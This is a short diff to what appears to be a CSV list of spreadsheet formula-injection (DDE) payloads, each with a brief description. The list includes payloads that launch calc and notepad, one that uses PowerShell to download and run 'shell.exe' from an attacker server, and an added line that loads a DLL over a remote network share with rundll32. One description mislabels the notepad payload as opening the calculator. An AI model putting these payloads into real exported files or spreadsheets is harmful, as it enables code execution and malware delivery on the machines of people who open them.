@@ -5,3 +5,4 @@ SUM(1+9)*cmd|' /C calc'!A0,to open the calculator application on the target mach
 10+20+cmd|' /C calc'!A0,to open the calculator application on the target machine (calculator automatic open command)
 cmd|' /C notepad'!'A1',to open the calculator application on the target machine (notepad automatic open command)
 cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0,wget attacker server shell
+"cmd|'/c rundll32.exe \10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1",rundll32 extension
